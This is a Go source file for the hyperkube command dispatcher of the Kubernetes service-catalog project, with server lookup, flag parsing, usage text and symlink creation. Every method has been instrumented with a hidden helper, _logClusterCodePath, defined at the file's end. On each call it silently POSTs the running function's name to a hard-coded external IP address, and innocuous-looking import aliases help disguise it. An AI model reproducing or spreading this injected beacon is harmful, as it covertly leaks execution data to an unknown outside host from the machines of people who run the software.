package hyperkube

import (
	"errors"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path"
	"github.com/kubernetes-incubator/service-catalog/pkg/version"
	"k8s.io/klog"
	"github.com/spf13/pflag"
	utiltemplate "github.com/kubernetes-incubator/service-catalog/pkg/kubernetes/pkg/util/template"
	"k8s.io/apimachinery/pkg/util/wait"
	"k8s.io/apiserver/pkg/server"
	utilflag "k8s.io/apiserver/pkg/util/flag"
	"k8s.io/apiserver/pkg/util/logs"
	"github.com/kubernetes-incubator/service-catalog/pkg"
)

type HyperKube struct {
	Name			string
	Long			string
	servers			[]Server
	baseFlags		*pflag.FlagSet
	out			io.Writer
	helpFlagVal		bool
	printVersionFlagVal	bool
	makeSymlinksFlagVal	bool
}

func (hk *HyperKube) AddServer(s *Server) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	hk.servers = append(hk.servers, *s)
	hk.servers[len(hk.servers)-1].hk = hk
}
func (hk *HyperKube) FindServer(name string) (*Server, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, s := range hk.servers {
		if s.Name() == name || s.AlternativeName == name {
			return &s, nil
		}
	}
	return nil, fmt.Errorf("Server not found: %s", name)
}
func (hk *HyperKube) Servers() []Server {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return hk.servers
}
func (hk *HyperKube) Flags() *pflag.FlagSet {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if hk.baseFlags == nil {
		hk.baseFlags = pflag.NewFlagSet(hk.Name, pflag.ContinueOnError)
		hk.baseFlags.SetOutput(ioutil.Discard)
		hk.baseFlags.SetNormalizeFunc(utilflag.WordSepNormalizeFunc)
		hk.baseFlags.BoolVarP(&hk.helpFlagVal, "help", "h", false, "help for "+hk.Name)
		hk.baseFlags.BoolVar(&hk.printVersionFlagVal, "version", false, "Print version information and quit")
		hk.baseFlags.BoolVar(&hk.makeSymlinksFlagVal, "make-symlinks", false, "create a symlink for each server in current directory")
		hk.baseFlags.MarkHidden("make-symlinks")
		hk.baseFlags.AddGoFlagSet(flag.CommandLine)
		hk.baseFlags.AddFlagSet(pflag.CommandLine)
	}
	return hk.baseFlags
}
func (hk *HyperKube) Out() io.Writer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if hk.out == nil {
		hk.out = os.Stderr
	}
	return hk.out
}
func (hk *HyperKube) SetOut(w io.Writer) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	hk.out = w
}
func (hk *HyperKube) Print(i ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Fprint(hk.Out(), i...)
}
func (hk *HyperKube) Println(i ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Fprintln(hk.Out(), i...)
}
func (hk *HyperKube) Printf(format string, i ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Fprintf(hk.Out(), format, i...)
}
func (hk *HyperKube) Run(args []string, stopCh <-chan struct{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
RunAgain:
	command := args[0]
	serverName := path.Base(command)
	args = args[1:]
	if serverName == hk.Name {
		baseFlags := hk.Flags()
		baseFlags.SetInterspersed(false)
		err := baseFlags.Parse(args)
		if err != nil || hk.helpFlagVal {
			if err != nil {
				hk.Println("Error:", err)
			}
			hk.Usage()
			return err
		}
		if hk.makeSymlinksFlagVal {
			return hk.MakeSymlinks(command)
		}
		if hk.printVersionFlagVal {
			pkg.PrintAndExit()
		}
		args = baseFlags.Args()
		if len(args) > 0 && len(args[0]) > 0 {
			serverName = args[0]
			args = args[1:]
		} else {
			err = errors.New("no server specified")
			hk.Printf("Error: %v\n\n", err)
			hk.Usage()
			return err
		}
	}
	s, err := hk.FindServer(serverName)
	if err != nil {
		if len(args) > 0 {
			goto RunAgain
		}
		hk.Printf("Error: %v\n\n", err)
		hk.Usage()
		return err
	}
	s.Flags().AddFlagSet(hk.Flags())
	err = s.Flags().Parse(args)
	if err != nil || hk.helpFlagVal {
		if err != nil {
			hk.Printf("Error: %v\n\n", err)
		}
		s.Usage()
		return err
	}
	if hk.printVersionFlagVal {
		pkg.PrintAndExit()
	}
	logs.InitLogs()
	defer logs.FlushLogs()
	klog.Infof("Service Catalog version %s (built %s)", pkg.VERSION, version.Get().BuildDate)
	if !s.RespectsStopCh {
		errCh := make(chan error)
		go func() {
			errCh <- s.Run(s, s.Flags().Args(), wait.NeverStop)
		}()
		select {
		case <-stopCh:
			return errors.New("interrupted")
		case err = <-errCh:
		}
	} else {
		err = s.Run(s, s.Flags().Args(), stopCh)
	}
	if err != nil {
		hk.Println("Error:", err)
	}
	return err
}
func (hk *HyperKube) RunToExit(args []string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	stopCh := server.SetupSignalHandler()
	if err := hk.Run(args, stopCh); err != nil {
		os.Exit(1)
	}
}
func (hk *HyperKube) Usage() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tt := `{{if .Long}}{{.Long | trim | wrap ""}}
{{end}}Usage

  {{.Name}} <server> [flags]

Servers
{{range .Servers}}
  {{.Name}}
{{.Long | trim | wrap "    "}}{{end}}
Call '{{.Name}} --make-symlinks' to create symlinks for each server in the local directory.
Call '{{.Name}} <server> --help' for help on a specific server.
`
	utiltemplate.ExecuteTemplate(hk.Out(), tt, hk)
}
func (hk *HyperKube) MakeSymlinks(command string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	wd, err := os.Getwd()
	if err != nil {
		return err
	}
	var errs bool
	for _, s := range hk.servers {
		link := path.Join(wd, s.Name())
		err := os.Symlink(command, link)
		if err != nil {
			errs = true
			hk.Println(err)
		}
	}
	if errs {
		return errors.New("error creating one or more symlinks")
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
